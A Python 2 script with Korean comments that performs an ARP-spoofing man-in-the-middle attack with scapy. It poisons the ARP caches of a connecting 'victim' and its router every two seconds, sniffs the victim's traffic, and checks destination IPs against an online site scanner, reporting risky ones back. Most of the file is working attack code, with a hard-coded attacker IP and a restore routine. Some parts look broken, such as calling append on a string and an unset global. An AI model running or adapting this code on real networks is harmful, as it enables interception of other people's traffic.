#모듈호출 부분
import subprocess
import scapy.all
import time
import threading
import urllib2
import BeautifulSoup
import socket
import multiprocessing
import sys
import os

#필요한 전역변수 선언부분
attacker_ip='192.9.13.229'
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
contents=''
victim_ip=''
router_ip=''
client=''

#목적지 ip가 안전한지 아닌지 검사하는 함수이다
#검사하고자 하는 ip를 매개변수로 받아 위험한 ip라고 판단되면 클라이언트 프로그램에 ip주소를 보낸다
#검사를 하는 방법은 https://sitecheck.sucuri.net 웹사이트를 이용했다 웹 개발자들에게 감사를 표시하고 싶다.
def checking_ip(ip_address):
    scores={'Low Risk':1, 'Medium Risk':2, 'High Risk':5}
    score_sum=0
    a=urllib2.urlopen('https://sitecheck.sucuri.net/results/'+ip_address)
    html=BeautifulSoup.BeautifulSoup(a)
    result=html.findAll('table', attrs={'class':'table scan-findings'})
    if len(result) <=0:
        return 0
    result=result[0].findAll('td')
    if result[2]=='Critical':
        return 0
    for i in range(len(result)/4):
        try:
            print result[i*4+2].text
            score_sum+=scores[result[i*4+2].text]
        except:
            score_sum+=10
    #이 아래의 조건문으로 얼마나 검사를 타이트하게 진행할 것인지 정할 수 있다
    if score_sum > 5:
        client.send(ip_address)
        with open('test.txt', 'a') as f:
            f.write(ip_address+' ')
        contents.append(ip_address)

#ip를 매개변수로 입력받으면 mac 어드레스로 돌려준다.
def getMac(host):
    a=subprocess.Popen(["arp", "-a"], stdout=subprocess.PIPE)
    a=a.stdout.read().split('\n')[:-1]
    for i in a:
        tmp=i.split(' ')
        if host in tmp[1]:
            return tmp[3]

#attack에 해당하는 함수이다 이는 mitm 공격을 수행한다.
#이 함수를 반복적으로 실행함으로써 라우터와 피해자의 mac을 속을수 있다.
def attack(victim_ip, router_ip):
    victim_mac=getMac(victim_ip)
    router_mac=getMac(router_ip)
    scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac))
    scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac))

#recover에 해당하는 함수이다 이는 mitm 공격을 종료한다
#이 함수를 실행함으로써 라우터와 피해자 mac을 원래대로 돌릴수 있다
def recover(victim_ip, router_ip):
    victim_mac=getMac(victim_ip)
    router_mac=getMac(router_ip)
    scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=3)
    scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=router_mac), count=3)

#scapy의 sniff가 발생할때 콜백함수의 형태로 작동하는 함수이다.
#ip의 위험한 정도를 체크하는 함수인 checking_ip를 호출한다.
def pr(x):
    if x.haslayer('IP') and x['IP'].src == victim_ip:
        print x['IP'].dst
        checking_ip(x['IP'].dst)

def sniffing(clients, victim_ip, contents):
    scapy.all.sniff(prn=pr)

#가장 처음 호출되는 함수이다
#mitm을 수행하는 무한루프를 가지고 있으며 sniff를 위해 스레드를 하나 추가로 생성한다.
#리눅스에서 root권한(관리자 권한)을 가지고 실행시켜야 한다
def main(client, client_address):
    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")
    victim_ip=client_address[0]
    router_ip=client.recv(1024)
    print victim_ip, router_ip
    if getMac(router_ip) == None:
        print 'We can not find router mac address'
        return

    if getMac(victim_ip) == None:
        print 'we can not find victim mac address'
        return
    t=threading.Thread(target=sniffing, args=(client, victim_ip, contents))
    t.start()


    try:
        while True:
            attack(victim_ip, router_ip)
            time.sleep(2)
    except Exception, err:
        print err
        recover(victim_ip, router_ip)
        t.join(10)
        exit()



if __name__ == '__main__':
    sock.bind((attacker_ip, 9876))
    sock.listen(5)
    client, client_address=sock.accept()
    p=multiprocessing.Process(target=main, args=(client, client_address))
    p.start()